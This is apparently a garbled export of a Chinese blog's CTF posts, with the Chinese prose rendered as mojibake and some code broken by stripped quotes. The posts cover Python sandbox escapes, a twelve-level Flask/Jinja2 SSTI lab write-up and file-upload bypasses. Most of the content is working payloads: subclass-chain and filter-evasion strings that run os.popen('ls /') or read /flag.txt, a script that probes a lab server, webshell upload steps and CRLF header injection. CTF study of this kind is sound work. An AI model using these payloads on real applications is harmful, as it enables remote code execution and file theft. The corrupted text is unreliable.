fileï¼š file(key).read()Macr0phag3 file(key, w).write(Macr0phag3) file(key).read()Macr0phag3 è¿˜æœ‰ä¸ª openï¼Œ2.x ä¸ 3.x é€šç”¨ã€‚ è¿˜æœ‰ä¸€äº›åº“ï¼Œä¾‹å¦‚ï¼štypes.FileType(rw)ã€platform.popen(rw)ã€linecache.getlines(r)ã€‚ ä¸ºä»€ä¹ˆè¯´å†™æ¯”è¯»å±å®³å¤§å‘¢ï¼Ÿå› ä¸ºå¦‚æœèƒ½å†™ï¼Œå¯ä»¥å°†ç±»ä¼¼çš„æ–‡ä»¶ä¿å­˜ä¸ºmath.pyï¼Œç„¶å import è¿›æ¥ï¼šmath.pyï¼š import osprint(os.system(whoami)) è°ƒç”¨ import mathmacr0phag3 è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œ py æ–‡ä»¶å‘½åæ˜¯æœ‰æŠ€å·§çš„ã€‚ä¹‹æ‰€ä»¥è¦æŒ‘ä¸€ä¸ªå¸¸ç”¨çš„æ ‡å‡†åº“æ˜¯å› ä¸ºè¿‡æ»¤åº“åå¯èƒ½é‡‡ç”¨çš„æ˜¯ç™½åå•ã€‚å¹¶ä¸”ä¹‹å‰è¯´è¿‡æœ‰äº›åº“æ˜¯åœ¨sys.modulesä¸­æœ‰çš„ï¼Œè¿™äº›åº“æ— æ³•è¿™æ ·åˆ©ç”¨ï¼Œä¼šç›´æ¥ä»sys.modulesä¸­åŠ å…¥ï¼Œæ¯”å¦‚reï¼š re in sys.modulesTrue math in sys.modulesFalse å½“ç„¶åœ¨import re ä¹‹å‰del sys.modules[re]ä¹Ÿä¸æ˜¯ä¸å¯ä»¥â€¦ æœ€åï¼Œè¿™é‡Œçš„æ–‡ä»¶å‘½åéœ€è¦æ³¨æ„çš„åœ°æ–¹å’Œæœ€å¼€å§‹çš„é‚£ä¸ªéå†æµ‹è¯•çš„æ–‡ä»¶ä¸€æ ·ï¼šç”±äºå¾…æµ‹è¯•çš„åº“ä¸­æœ‰ä¸ªå« testçš„ï¼Œå¦‚æœæŠŠéå†æµ‹è¯•çš„æ–‡ä»¶ä¹Ÿå‘½åä¸º testï¼Œä¼šå¯¼è‡´é‚£ä¸ªæ–‡ä»¶è¿è¡Œ 2 æ¬¡ï¼Œå› ä¸ºè‡ªå·± import äº†è‡ªå·±ã€‚ è¯»æ–‡ä»¶æš‚æ—¶æ²¡ä»€ä¹ˆå‘ç°ç‰¹åˆ«çš„åœ°æ–¹ã€‚ å‰©ä¸‹çš„å°±æ˜¯æ ¹æ®ä¸Šé¢çš„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤é‡‡ç”¨çš„ç»•è¿‡æ–¹æ³•å»å¯»æ‰¾ payload äº†ï¼Œæ¯”å¦‚ï¼š __builtins__.open(key).read()Macr0phag3 æˆ–è€… ().__class__.__base__.__subclasses__()[40](key).read()Macr0phag3 æ•æ„Ÿä¿¡æ¯æ³„éœ²è¿™ä¸ªä¹Ÿç®—åªèƒ½è¯»å§ã€‚ dir() __import__(__main__).xï¼Œå…¶ä¸­ __main__ è¿˜ä¼šæ³„éœ²è„šæœ¬çš„ç»å¯¹è·¯å¾„ï¼šmodule __main__ from xxx.py __file__ï¼Œæ–‡ä»¶ç»å¯¹è·¯å¾„ x.__dict__ locals() globals() vars() sys._getframe(0).f_code.co_varnamesï¼š ç”¨äºè·å–å½“å‰æ‰§è¡Œä»£ç å—çš„å±€éƒ¨å˜é‡åç§°åˆ—è¡¨ï¼š sys._getframe(0): è¿™æ˜¯ä¸€ä¸ªè°ƒç”¨ sys æ¨¡å—ä¸­çš„ _getframe() å‡½æ•°çš„ç¤ºä¾‹ã€‚_getframe() å‡½æ•°ç”¨äºè®¿é—®è°ƒç”¨æ ˆçš„å¸§å¯¹è±¡ï¼Œå‚æ•° 0 è¡¨ç¤ºè·å–å½“å‰å¸§ï¼ˆå³è°ƒç”¨è¯¥è¯­å¥çš„å¸§ï¼‰ã€‚ .f_code: è¿™æ˜¯å¸§å¯¹è±¡çš„ä¸€ä¸ªå±æ€§ï¼Œä»£è¡¨æ­£åœ¨æ‰§è¡Œçš„ä»£ç çš„ä»£ç å¯¹è±¡ã€‚ .co_varnames: è¿™æ˜¯ä»£ç å¯¹è±¡çš„ä¸€ä¸ªå±æ€§ï¼ŒåŒ…å«äº†å½“å‰ä»£ç å—çš„å±€éƒ¨å˜é‡åç§°åˆ—è¡¨ sys._getframe(0).f_localsï¼š ç”¨äºè·å–å½“å‰æ‰§è¡Œä»£ç å—çš„å±€éƒ¨å˜é‡å­—å…¸ï¼š sys._getframe(0): è¿™æ˜¯ä¸€ä¸ªè°ƒç”¨ sys æ¨¡å—ä¸­çš„ _getframe() å‡½æ•°çš„ç¤ºä¾‹ã€‚_getframe() å‡½æ•°ç”¨äºè®¿é—®è°ƒç”¨æ ˆçš„å¸§å¯¹è±¡ï¼Œå‚æ•° 0 è¡¨ç¤ºè·å–å½“å‰å¸§ï¼ˆå³è°ƒç”¨è¯¥è¯­å¥çš„å¸§ï¼‰ã€‚ .f_locals: è¿™æ˜¯å¸§å¯¹è±¡çš„ä¸€ä¸ªå±æ€§ï¼ŒåŒ…å«äº†å½“å‰æ‰§è¡Œä»£ç å—çš„å±€éƒ¨å˜é‡å­—å…¸ inspect.xï¼Œinspect æœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥è·å–ä¿¡æ¯ï¼Œæ¯”å¦‚è·å–æºç å¯ä»¥ç”¨ inspect.getsourceï¼Œè¿˜æœ‰å…¶ä»–å¾ˆå¤šçš„åŠŸèƒ½ â€¦ ç»•è¿‡å§¿åŠ¿è¿‡æ»¤ [ ]åº”å¯¹çš„æ–¹å¼å°±æ˜¯å°†[]çš„åŠŸèƒ½ç”¨popã€__getitem__ ä»£æ›¿ï¼ˆå®é™…ä¸Ša[0]å°±æ˜¯åœ¨å†…éƒ¨è°ƒç”¨äº†a.__getitem__(0)ï¼‰ï¼š .__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(linecache).os.popen(whoami).read()macr0phag3 å½“ç„¶ï¼Œdict ä¹Ÿæ˜¯å¯ä»¥ pop çš„ï¼ša: 1.pop(a) å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ next(iter()) æ›¿ä»£ï¼Œæˆ–è®¸å¯ä»¥åŠ ä¸Š max ä¹‹ç±»çš„ç©æ„ã€‚ è¿‡æ»¤å¼•å· chr æœ€ç®€å•å°±æ˜¯ç”¨ chr å•¦ os.system( chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)) æ‰£å­—ç¬¦ åˆ©ç”¨ str å’Œ []ï¼ŒæŒ¨ä¸ªæŠŠå­—ç¬¦æ‹¼æ¥å‡ºæ¥ os.system( str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(().__class__.__new__)[10]+str(().__class__.__new__)[3]) å½“ç„¶ [] å¦‚æœè¢«è¿‡æ»¤äº†ä¹Ÿå¯ä»¥ bypassï¼Œå‰é¢è¯´è¿‡äº†ã€‚ å¦‚æœ str è¢«è¿‡æ»¤äº†æ€ä¹ˆåŠå‘¢ï¼Ÿtype()()ã€format() å³å¯ã€‚åŒç†ï¼Œintã€list éƒ½å¯ä»¥ç”¨ type æ„é€ å‡ºæ¥ã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸² é‚£è¿‡æ»¤äº†å¼•å·ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²è¿˜èƒ½ç”¨å—ï¼Ÿ (chr(37)+str(.__class__)[1])%100 == d åˆèµ·é£äº†â€¦ dict() æ‹¿é”®å®ƒä¸é¦™å—ï¼Ÿ whoami ==list(dict(whoami=1))[0] ==str(dict(whoami=1))[2:8] == é™åˆ¶æ•°å­—ä¸Šé¢æåˆ°äº†å­—ç¬¦ä¸²è¿‡æ»¤ç»•è¿‡ï¼Œé¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œå¦‚æœæ˜¯è¿‡æ»¤äº†æ•°å­—ï¼ˆè™½ç„¶è¿™ç§æƒ…å†µå¾ˆå°‘è§ï¼‰ï¼Œé‚£ç»•è¿‡çš„æ–¹å¼å°±æ›´å¤šäº†ï¼Œæˆ‘è¿™é‡Œéšä¾¿åˆ—ä¸‹ï¼š 0ï¼šint(bool([]))ã€Flaseã€len([])ã€any(()) 1ï¼šint(bool([]))ã€Trueã€all(())ã€int(list(list(dict(aá=())).pop()).pop()) è·å–ç¨å¾®å¤§çš„æ•°å­—ï¼šlen(str(.keys))ï¼Œä¸è¿‡éœ€è¦æ…¢æ…¢æ‰¾é•¿åº¦ç¬¦åˆçš„å­—ç¬¦ä¸² 1.0ï¼šfloat(True) -1ï¼š~0 â€¦ å…¶å®æœ‰äº† 0 å°±å¯ä»¥äº†ï¼Œè¦å•¥æ•´æ•°ç›´æ¥åšè¿ç®—å³å¯ï¼š 0 ** 0 == 11 + 1 == 22 + 1 == 32 ** 2 == 4... é™åˆ¶ç©ºæ ¼ç©ºæ ¼é€šå¸¸æ¥è¯´å¯ä»¥é€šè¿‡ ()ã€[] æ›¿æ¢æ‰ã€‚ä¾‹å¦‚ï¼š [i for i in range(10) if i == 5]` å¯ä»¥æ›¿æ¢ä¸º `[[i][0]for(i)in(range(10))if(i)==5] é™åˆ¶è¿ç®—ç¬¦ ! - + è¿™å‡ ä¸ªæ¯”è¾ƒç®€å•å°±ä¸è¯´äº†ã€‚ == å¯ä»¥ç”¨ in æ¥æ›¿æ¢ã€‚ æ›¿æ¢ or çš„æµ‹è¯•ä»£ç  for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]: ans = i[0]==i[1] or i[2]==i[3] print(bool(eval(fi[0]==i[1] | i[2]==i[3])) == ans) print(bool(eval(f- i[0]==i[1] - i[2]==i[3])) == ans) print(bool(eval(fi[0]==i[1] + i[2]==i[3])) == ans) ä¸Šé¢è¿™å‡ ä¸ªè¡¨è¾¾å¼éƒ½å¯ä»¥æ›¿æ¢æ‰ or æ›¿æ¢ and çš„æµ‹è¯•ä»£ç  for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]: ans = i[0]==i[1] and i[2]==i[3] print(bool(eval(fi[0]==i[1] i[2]==i[3])) == ans) print(bool(eval(fi[0]==i[1] * i[2]==i[3])) == ans) ä¸Šé¢è¿™å‡ ä¸ªè¡¨è¾¾å¼éƒ½å¯ä»¥æ›¿æ¢æ‰ and è¿‡æ»¤äº† () åˆ©ç”¨è£…é¥°å™¨ @ åˆ©ç”¨é­”æœ¯æ–¹æ³•ï¼Œä¾‹å¦‚ enum.EnumMeta.__getitem__ f å­—ç¬¦ä¸²æ‰§è¡Œf å­—ç¬¦ä¸²ç®—ä¸ä¸Šä¸€ä¸ªç»•è¿‡ï¼Œæ›´åƒæ˜¯ä¸€ç§æ–°çš„æ”»å‡»é¢ï¼Œé€šå¸¸æƒ…å†µä¸‹ç”¨æ¥è·å–æ•æ„Ÿä¸Šä¸‹æ–‡ä¿¡æ¯,ä¾‹å¦‚è¿‡å»ç¯å¢ƒå˜é‡ whoami.__class__.__dict__whoami.__globals__[os].__dict__whoami.__globals__[os].environwhoami.__globals__[sys].pathwhoami.__globals__[sys].modules# Access an element through several linkswhoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__ ä¹Ÿå¯ä»¥ç›´æ¥ RCE f__import__(os).system(whoami)kali0 f__builtins__.__import__(os).__dict__[popen](ls).read()","tags":["python"],"categories":["CTF"]},{"title":"SSTIé¶åœºé¢˜è§£","path":"/2024/03/12/SSTIé¶åœºé¢˜è§£/","content":"level-1(no waf)éå†ç›®æ ‡ä¸­å«æœ‰å†…å»ºå‡½æ•° eval çš„å­ç±»çš„ç´¢å¼•å·ï¼š import requestsif __name__ == __main__: post_url = http://124.70.99.199:10086/level/1 for i in range(200): param = code: ().__class__.__bases__[0].__subclasses__()[+str(i)+].__init__.__globals__[__builtins__] res = requests.post(post_url, data=param) if eval in res.text: print(i,!!!!!!!!!!!!!!!!!!!!!!!!!!) else: print(i,res.text,res.status_code,no) æ‰€ä»¥éšä¾¿æŒ‘ä¸€ä¸ªæ„é€ payloadä¸ºï¼š''.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()') è·å–åˆ°flagçš„ä½ç½®ï¼Œè¯»å–flagï¼š''.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"cat /flag.txt\").read()') level-2(è¿‡æ»¤äº†å¤§æ‹¬å·)å¯ä»¥ç”¨ %print(......)% çš„å½¢å¼æ¥ä»£æ›¿å¤§æ‹¬å· ï¼Œå¦‚ä¸‹ï¼š %print(.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__[__builtins__][eval](__import__(os).popen(ls /).read()))% è·å–åˆ°flagçš„ä½ç½®ï¼Œè¯»å–flag level-3(no waf and blind)æ²¡æœ‰ä»»ä½•å›æ˜¾ï¼Œæœ€å¼€å§‹æ˜¯æƒ³è¦åˆ©ç”¨curlå‘½ä»¤æ¥æŠŠæ–‡ä»¶å¤–å¸¦å‡ºæ¥çš„curl -d cat /flag.txt -o output.txtï¼Œï¼Œflag.txtä¼šè¢«å†™åˆ°app.pyåŒç›®å½•ä¸‹ï¼Œè¯»å–ä¸å‡ºæ¥ï¼Œæ‰€ä»¥è¿™ä¸ªå°è¯•å¤±è´¥äº† åé¢å­¦é•¿è¯´ä¸å¿…å¦‚æ­¤ï¼Œç›®å½•ä¸‹é¢åªæœ‰staticç›®å½•ä¸‹é¢çš„æ–‡ä»¶å¯ä»¥è¢«ç›´æ¥è¯»å–ï¼Œæ‰€ä»¥å¯ä»¥æŠŠè¦çš„æ–‡ä»¶å†™åˆ°staticç›®å½•ä¸‹ï¼Œå°±å¯ä»¥ç›´æ¥é€šè¿‡urlæ¥è¿›è¡Œè®¿é—®äº† æ‰€ä»¥payloadå¦‚ä¸‹ .__class__.__bases__[0].__subclasses__()[158].__init__.__globals__[__builtins__][eval](__import__(os).popen(cat /flag.txt static/output.txt).read()) ç„¶åç›´æ¥è®¿é—®/static/output.txtï¼Œä¾¿å¯ä»¥å¾—åˆ°flag.txtçš„å†…å®¹ level-4(è¿‡æ»¤äº†[])å¯ä»¥ä½¿ç”¨ __getitem__() æ–¹æ³•æ¥ç»•è¿‡ä¸­æ‹¬å·ï¼š .__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(158).__init__.__globals__.__getitem__(__builtins__).__getitem__(eval)(__import__(os).popen(ls /).read()) è·å–åˆ°flagçš„ä½ç½®ï¼Œè¯»å–flag level-5(è¿‡æ»¤äº†å•åŒå¼•å·)å¯ä»¥ä½¿ç”¨requestså¯¹è±¡è¿›è¡Œç»•è¿‡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š level-6(è¿‡æ»¤äº†ä¸‹åˆ’çº¿)ä½¿ç”¨requestså¯¹è±¡è¿›è¡Œç»•è¿‡ï¼Œ code=[request.values.class][request.values.base][request.values.subclasses]()[284][request.values.init][request.values.globals][linecache][os].popen(ls /).read()class=__class__base=__base__subclasses=__subclasses__init=__init__globals=__globals__ ä»¥ä¸Šä½¿ç”¨æ•°å­—æˆ–è€…å­—ç¬¦ä¸²éƒ½å¯ä»¥æº¯æºåˆ°objectç±»ï¼Œä½†æ˜¯()ï¼Œ[]ç­‰çš„ä¸è¡Œï¼Œå› ä¸ºä¸¤ä¸ªçš„çˆ¶ç±»åˆ†åˆ«æ˜¯tupleå’Œlistï¼Œæ‰€ä»¥ä¸€æ—¦æŒ‰ç…§ä¸Šé¢çš„è¿›è¡Œæ“ä½œ ä¾¿æ˜¯åœ¨åˆå§‹åŒ–å…ƒç»„æˆ–è€…åˆ—è¡¨ ().__class__[request.values.base]base=__base__å›æ˜¾Hello tuple[__base__][].__class__[request.values.base]base=__base__å›æ˜¾Hello list[__base__] è¿˜æœ‰ä¸€ç§ç¼–ç ç»•è¿‡ __class__ = \\x5f\\x5fclass\\x5f\\x5f å…¶ä¸­_çš„åå…­è¿›åˆ¶ç¼–ç ä¸º\\x5fï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºå¦‚ä¸‹çš„payloadï¼š ().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__[popen](ls /).read() ()|attr(\\x5f\\x5fclass\\x5f\\x5f)|attr(\\x5f\\x5fbase\\x5f\\x5f)|attr(\\x5f\\x5fsubclasses\\x5f\\x5f)()|attr(\\x5f\\x5fgetitem\\x5f\\x5f)(154)|attr(\\x5f\\x5finit\\x5f\\x5f)|attr(\\x5f\\x5fglobals\\x5f\\x5f)|attr(\\x5f\\x5fgetitem\\x5f\\x5f)(popen)(ls /)|attr(read)() level-7(è¿‡æ»¤ç‚¹)ä½¿ç”¨|attræ¥è¿›è¡Œç»•è¿‡ï¼Œpayloadå¦‚ä¸‹ï¼š code=|attr(__class__)|attr(__bases__)|attr(__getitem__)(0)|attr(__subclasses__)()|attr(__getitem__)(154)|attr(__init__)|attr(__globals__)|attr(__getitem__)(popen)(ls /)|attr(read)() ä¹Ÿå¯ä»¥ç”¨[]æ¥ç»•è¿‡ï¼Œå¦‚ä¸‹ï¼š code=[__class__][__base__][__subclasses__]()[154][__init__][__globals__][popen](ls /)[read]() level-8è¿‡æ»¤äº†[class, arg, form, value, data, request, init, global, open, mro, base, attr] å½“ç”¨[]è¿›è¡Œç»•è¿‡çš„æ—¶å€™ï¼Œé‡Œé¢çš„æ‰€æœ‰å†…å®¹éƒ½å¯ä»¥è¢«ç¼–ç ï¼Œpayloadå¦‚ä¸‹ï¼š code=[\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f][\\u005f\\u005f\\u0062\\u0061\\u0073\\u0065\\u005f\\u005f][\\u005f\\u005f\\u0073\\u0075\\u0062\\u0063\\u006c\\u0061\\u0073\\u0073\\u0065\\u0073\\u005f\\u005f]()[154][\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f][\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f][\\u0070\\u006f\\u0070\\u0065\\u006e](ls /)[read]() å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥æ¥è¿›è¡Œç»•è¿‡ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº† level-9(è¿‡æ»¤æ•°å­—0åˆ°9)é¦–å…ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿‡æ»¤å™¨|lengthæ¥æ„é€ æ•°å­—è¿›è¡Œç»•è¿‡ï¼š% set a='aaaaaaaaaaa'|length*'aa'|length*'aaaaaaa'|length %a æ‰€ä»¥payloadå¦‚ä¸‹ï¼š code=% set a=aaaaaaaaaaa|length*aa|length*aaaaaaa|length %a.__class__.__base__.__subclasses__()[a].__init__.__globals__[popen](ls /).read() level-10set config = Noneè¿™ä¸€å…³çš„ç›®çš„æ˜¯æ‹¿åˆ°config,å½“æˆ‘ä»¬ä½¿ç”¨configä»¥åŠselfæ—¶éƒ½è¿”å›äº†None.çœ‹æ¥æ˜¯è¢«banäº†,æ‰€ä»¥å¾—é‡æ–°å¯»æ‰¾ä¸€ä¸ªå‚¨å­˜ç›¸å…³ä¿¡æ¯çš„å˜é‡ï¼Œå‘ç°å­˜åœ¨è¿™ä¹ˆä¸€ä¸ªå˜é‡current_appæ˜¯æˆ‘ä»¬éœ€è¦çš„.å®˜ç½‘å¯¹current_appæä¾›äº†è¿™ä¹ˆä¸€å¥è¯´æ˜ åº”ç”¨ä¸Šä¸‹æ–‡ä¼šåœ¨å¿…è¦æ—¶è¢«åˆ›å»ºå’Œé”€æ¯ã€‚å®ƒä¸ä¼šåœ¨çº¿ç¨‹é—´ç§»åŠ¨ï¼Œå¹¶ä¸”ä¹Ÿä¸ä¼šåœ¨ä¸åŒçš„è¯·æ±‚ä¹‹é—´å…±äº«ã€‚æ­£å› ä¸ºå¦‚æ­¤ï¼Œå®ƒæ˜¯ä¸€ä¸ªå­˜å‚¨æ•°æ®åº“è¿æ¥ä¿¡æ¯æˆ–æ˜¯åˆ«çš„ä¸œè¥¿çš„æœ€ä½³ä½ç½®ã€‚ å› æ­¤,æ­¤å¤„èƒ½ä½¿ç”¨current_appç»•è¿‡. æ„é€ payload,æ‹¿åˆ°config url_for.__globals__[current_app].configget_flashed_messages.__globals__[current_app].config ä¸¤å¥è¦åˆ†åˆ«å¸¦è¿›å»ï¼Œä¸èƒ½åŒæ—¶å¸¦è¿›å» level-11è¿‡æ»¤äº†[\\, , +, request, ., [, ]]ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰ä»¥ä¸‹çš„æ“ä½œï¼š ().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__[popen](ls /).read() % set a = dict(__cla=aa,ss__=bb)|join %% set b = dict(__ba=aa,se__=bb)|join %% set sub = dict(__subcl=aa,asses__=bb)|join %% set d = dict(__get=aa,item__=bb)|join %% set e = dict(__in=aa,it__=bb)|join %% set f = dict(__glo=aa,bals__=bb)|join %%set g=dict(pop=a,en=b)|join %% set c = dict(c=aa)|reverse|first %% set bfh = self|string|urlencode|first % % set bfhc=bfh~c %% set space = bfhc%((3~2)|int) % % set slas = bfhc%((4~7)|int) % %set ls = dict(ls=abc)|join %%set i= ls~space~slas %%set read = dict(read=aa)|join %1|attr(a)|attr(b)|attr(sub)()|attr(d)(154)|attr(e)|attr(f)|attr(d)(g)(i)|attr(read)() level-12è¿‡æ»¤äº†[_, ., 0-9, \\\\, \\, , [, ]] æ²¡æœ‰è¿‡æ»¤requestsï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»“åˆä¸Šé¢˜å¹¶é€šè¿‡requestså¯¹è±¡æ¥è¿›è¡Œç»•è¿‡ å€Ÿé‰´[ä½ è¿˜ä¸ä¼šFlaskSSTI?]ï¼šhttps://xz.aliyun.com/t/10394?time__1311=mq%2BxBDyDu7KDq40vdbievqWqGKG%3DKe1K4Dalichlgref=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3D1XE44Oe9LhAQthl0yGVsdHutPlRqph5qbyfEmDv259FgerbZ_mEeo5_XwD2uDZj6%26wd%3D%26eqid%3Da3e04c52003086bb0000000365ed5d11#toc-21","tags":["ssti"],"categories":["CTF"]},{"title":"æ–‡ä»¶ä¸Šä¼ å­¦ä¹ ","path":"/2024/03/03/æ–‡ä»¶ä¸Šä¼ å­¦ä¹ _max/æ–‡ä»¶ä¸Šä¼ å­¦ä¹ /","content":"å‰ç«¯æ£€æµ‹ä¸»è¦æ˜¯é€šè¿‡javascriptä»£ç è¿›è¡Œæ£€æµ‹ï¼Œéå¸¸å®¹æ˜“è¿›è¡Œç»•è¿‡ã€‚ åŸç†Webåº”ç”¨ç³»ç»Ÿè™½ç„¶å¯¹ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œäº†æ ¡éªŒï¼Œä½†æ˜¯æ ¡éªŒæ˜¯é€šè¿‡å‰ç«¯javascriptä»£ç å®Œæˆçš„ã€‚ç”±äºæ¶æ„ç”¨æˆ·å¯ä»¥å¯¹å‰ç«¯javascriptè¿›è¡Œä¿®æ”¹æˆ–è€…æ˜¯é€šè¿‡æŠ“åŒ…è½¯ä»¶ç¯¡æ”¹ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå°±ä¼šå¯¼è‡´åŸºäºjsçš„æ ¡éªŒå¾ˆå®¹æ˜“è¢«ç»•è¿‡ã€‚ å¦‚ä½•åˆ¤æ–­å½“å‰é¡µé¢ä½¿ç”¨å‰ç«¯isçš„éªŒè¯æ–¹å¼ å‰ç«¯éªŒè¯é€šè¿‡ä»¥åï¼Œè¡¨å•æˆåŠŸæäº¤åä¼šé€šè¿‡æµè§ˆå™¨å‘å‡ºâ”€æ¡ç½‘ç»œè¯·æ±‚ï¼Œä½†æ˜¯å¦‚æœå‰ç«¯éªŒè¯ä¸æˆåŠŸï¼Œåˆ™ä¸ä¼šå‘å‡ºè¿™é¡¹ç½‘ç»œè¯·æ±‚;å¯ä»¥åœ¨æµè§ˆå™¨çš„ç½‘ç»œå…ƒç´ ä¸­æŸ¥çœ‹æ˜¯å¦å‘å‡ºäº†ç½‘ç»œè¯·æ±‚ã€‚ ç»•è¿‡æ–¹æ³• åˆ é™¤æˆ–è€…ç¦ç”¨js:ç«ç‹æµè§ˆå™¨--about:config--JavaScriptenable-false (ajax) ä½¿ç”¨ä»£ç†ä¸Šä¼ æ–‡ä»¶ï¼ŒBurp Suite;ä¸Šä¼ ç¬¦åˆè¦æ±‚çš„æ–‡ä»¶ç±»å‹ï¼ŒæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹ã€‚ ç›´æ¥åˆ é™¤ä»£ç ä¸­onsubmitäº‹ä»¶ä¸­å…³äºæ–‡ä»¶ä¸Šä¼ æ—¶éªŒè¯ä¸Šä¼ æ–‡ä»¶çš„ç›¸å…³ä»£ç å³å¯æˆ–è€…å¯ä»¥ä¸åŠ è½½æ‰€æœ‰jsï¼Œè¿˜å¯ä»¥å°†htmlæºç copyä¸€ä»½åˆ°æœ¬åœ°ï¼Œç„¶åå¯¹ç›¸åº”ä»£ç è¿›è¡Œä¿®æ”¹ï¼Œæœ¬åœ°æäº¤å³å¯ã€‚ CTFHub-web-æ–‡ä»¶ä¸Šä¼ -å‰ç«¯éªŒè¯é¦–å…ˆæŸ¥çœ‹æºç å‘ç°å‘ç°åªå…è®¸jpgç­‰å‡ ç§åç¼€åæ–‡ä»¶é€šè¿‡ï¼Œæ‰€ä»¥å…ˆå°†æ‰€è¦ä¸Šä¼ çš„æ–‡ä»¶åç¼€åæ”¹ä¸ºjpgå½¢å¼è¿›è¡Œä¸Šä¼ ï¼Œä¸­é€”ç”¨bpæŠ“åŒ…ï¼Œå¦‚ä¸‹ï¼š å°†filenameæ”¹ä¸ºtest.phpï¼Œç„¶åå‘é€ï¼š å‘ç°æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œç„¶åæ‰“å¼€èšå‰‘è¿›è¡Œè¿æ¥ï¼Œè·å–åˆ°flagæ–‡ä»¶ï¼Œæ‰“å¼€å³å¯çœ‹åˆ°flag ç»•è¿‡Content-Dispositionåœ¨å¸¸è§„ HTTP å“åº”ä¸­ Content-Disposition ï¼Œå“åº”æ ‡å¤´æ˜¯ä¸€ä¸ªæ ‡å¤´ï¼ŒæŒ‡ç¤ºå†…å®¹æ˜¯åº”åœ¨æµè§ˆå™¨ä¸­ä»¥å†…è”æ–¹å¼æ˜¾ç¤ºï¼Œå³ä½œä¸ºç½‘é¡µæˆ–ç½‘é¡µçš„ä¸€éƒ¨åˆ†ï¼Œè¿˜æ˜¯ä½œä¸ºé™„ä»¶åœ¨æœ¬åœ°ä¸‹è½½å’Œä¿å­˜ï¼ˆè¿™æ“ä½œå½“ç„¶æ˜¯åœ¨æ–‡ä»¶æˆåŠŸä¸Šä¼ åï¼Œä½†æ˜¯ä½ æ— æ³•é€šè¿‡æ­£å¸¸çš„é€”å¾„å»è®¿é—®ï¼‰ ä¸¾ä¸ªä¾‹å­ï¼šContent-Disposition: attachment; filename=filename.jpg ä¸Šè¿°å“åº”Content-Disposition çš„å±æ€§ attachment è¡¨ç¤ºå‘Šè¯‰æµè§ˆå™¨å°†å†…å®¹ä½œä¸ºé™„ä»¶ä¸‹è½½ã€‚å¦å¤–ï¼Œfilename=filename.jpg æŒ‡å®šäº†ä¸‹è½½çš„æ–‡ä»¶åä¸º filename.jpg ä¸ºäº†è®©æˆ‘ä»¬çš„æ–‡ä»¶å¯ä»¥ä¼ ä¸Šå»ï¼Œè€Œä¸æ˜¯è¢«ä¸‹è½½ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨CRLFæ¼æ´æ¥è¿›è¡Œç»•è¿‡ï¼Œå³åœ¨æˆ‘ä»¬å¯æ§çš„å“åº”å¤´å†…è¾“å…¥ \\r \\r æˆ–è€…æ˜¯å°†å…¶ç¼–ç åçš„ %0d%0a%0d%0aï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœè¯´æŠ¥å¤´ä¸­çš„Content-Typeå¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨åé¢é”®å…¥text/html\\r \\r ï¼Œå°±å¯ä»¥å®ç°ç»•è¿‡ï¼Œè¿™æ˜¯ç”±äºæ³¨å…¥çš„å›è½¦ç¬¦å’Œæ¢è¡Œç¬¦å¯¼è‡´æµè§ˆå™¨å°† content-disposition æ ‡å¤´è§£é‡Šä¸º HTTP æ­£æ–‡çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤è¢«å¿½ç•¥ä¸ºå‘Šè¯‰æµè§ˆå™¨ä¸‹è½½çš„æŒ‡ä»¤ï¼Œå½“ç„¶ï¼Œä½¿ç”¨ %00ä¹Ÿå¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼Œä¸‹é¢æˆ‘ä»¬æ¥è‡ªå·±æµ‹è¯•ä¸€ä¸‹ï¼š ?php//highlight_file(__FILE__)$filename = $_GET[file];$fileheader = $_GET[header];$filetype = $_GET[type];if(isset($filetype)isset($fileheader)isset($filename)) header(Content-Type:.$filetype.); header(Content-Disposition:attachment;filename=.$fileheader.); readfile($filename); 